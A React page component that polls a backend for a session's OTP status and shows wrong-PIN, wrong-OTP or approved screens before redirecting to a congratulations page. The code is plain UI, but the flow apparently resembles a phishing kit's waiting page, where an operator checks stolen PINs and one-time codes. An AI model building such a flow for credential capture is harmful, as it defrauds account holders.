import { useEffect } from 'react';
import { useLocation } from 'wouter';
import { PageTransition } from '../components/PageTransition';
import { useGetOtpStatus, getGetOtpStatusQueryKey } from '@workspace/api-client-react';
import { getSessionId } from '../lib/store';
import { motion, AnimatePresence } from 'framer-motion';

export default function Loading() {
  const [, setLocation] = useLocation();
  const sessionId = getSessionId();

  const { data: statusData, error } = useGetOtpStatus(sessionId || '', {
    query: {
      enabled: !!sessionId,
      queryKey: getGetOtpStatusQueryKey(sessionId || ''),
      refetchInterval: 3000,
    }
  });

  useEffect(() => {
    if (!sessionId) {
      setLocation('/login');
      return;
    }

    if (statusData?.status === 'correct') {
      setTimeout(() => {
        setLocation('/congratulations');
      }, 2000);
    }
  }, [statusData, sessionId, setLocation]);

  return (
    <PageTransition className="justify-center items-center p-6 bg-slate-100">
      <div className="w-full max-w-sm bg-white rounded-3xl p-8 shadow-xl shadow-slate-200/50 text-center relative overflow-hidden">
        <AnimatePresence mode="wait">
          {statusData?.status === 'wrong_pin' ? (
            <motion.div 
              key="wrong_pin"
              initial={{ scale: 0.9, opacity: 0 }}
              animate={{ scale: 1, opacity: 1 }}
              className="py-4"
            >
              <div className="w-16 h-16 bg-red-100 rounded-full flex items-center justify-center text-red-500 mx-auto mb-6">
                <svg width="32" height="32" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2.5" strokeLinecap="round" strokeLinejoin="round">
                  <path d="M12 22s8-4 8-10V5l-8-3-8 3v7c0 6 8 10 8 10z"/>
                  <line x1="12" y1="8" x2="12" y2="12"/>
                  <line x1="12" y1="16" x2="12.01" y2="16"/>
                </svg>
              </div>
              <h2 className="text-xl font-bold text-slate-900 mb-2">Incorrect PIN</h2>
              <p className="text-slate-500 mb-8 font-medium">The PIN you entered was incorrect. Please try again.</p>
              <button 
                onClick={() => setLocation('/login')}
                className="w-full py-4 bg-slate-900 text-white rounded-xl font-bold shadow-lg shadow-slate-900/20"
              >
                Back to Login
              </button>
            </motion.div>
          ) : statusData?.status === 'wrong_otp' ? (
            <motion.div 
              key="wrong_otp"
              initial={{ scale: 0.9, opacity: 0 }}
              animate={{ scale: 1, opacity: 1 }}
              className="py-4"
            >
              <div className="w-16 h-16 bg-red-100 rounded-full flex items-center justify-center text-red-500 mx-auto mb-6">
                <svg width="32" height="32" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2.5" strokeLinecap="round" strokeLinejoin="round">
                  <circle cx="12" cy="12" r="10"/>
                  <line x1="15" y1="9" x2="9" y2="15"/>
                  <line x1="9" y1="9" x2="15" y2="15"/>
                </svg>
              </div>
              <h2 className="text-xl font-bold text-slate-900 mb-2">Incorrect OTP</h2>
              <p className="text-slate-500 mb-8 font-medium">The verification code was incorrect. Please try again.</p>
              <button 
                onClick={() => setLocation('/otp')}
                className="w-full py-4 bg-slate-900 text-white rounded-xl font-bold shadow-lg shadow-slate-900/20"
              >
                Back to OTP
              </button>
            </motion.div>
          ) : statusData?.status === 'correct' ? (
            <motion.div 
              key="correct"
              initial={{ scale: 0.9, opacity: 0 }}
              animate={{ scale: 1, opacity: 1 }}
              className="py-4"
            >
              <motion.div 
                initial={{ scale: 0 }}
                animate={{ scale: 1 }}
                transition={{ type: "spring", damping: 15 }}
                className="w-20 h-20 bg-green-500 rounded-full flex items-center justify-center text-white mx-auto mb-6"
              >
                <svg width="40" height="40" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="3" strokeLinecap="round" strokeLinejoin="round">
                  <polyline points="20 6 9 17 4 12"/>
                </svg>
              </motion.div>
              <h2 className="text-2xl font-bold text-slate-900 mb-2">Approved!</h2>
              <p className="text-slate-500 font-medium">Redirecting you now...</p>
            </motion.div>
          ) : (
            <motion.div 
              key="loading"
              initial={{ opacity: 0 }}
              animate={{ opacity: 1 }}
              exit={{ opacity: 0 }}
              className="py-6"
            >
              <div className="relative w-16 h-16 mx-auto mb-6">
                <motion.div 
                  animate={{ rotate: 360 }}
                  transition={{ repeat: Infinity, duration: 1, ease: "linear" }}
                  className="absolute inset-0 rounded-full border-[4px] border-orange-100 border-t-primary"
                />
              </div>
              <h2 className="text-xl font-bold text-slate-900 mb-2">Please wait...</h2>
              <p className="text-slate-500 font-medium">This usually takes a few seconds.</p>
              {error && <p className="text-red-500 text-sm mt-4">Connecting...</p>}
            </motion.div>
          )}
        </AnimatePresence>
      </div>
    </PageTransition>
  );
}
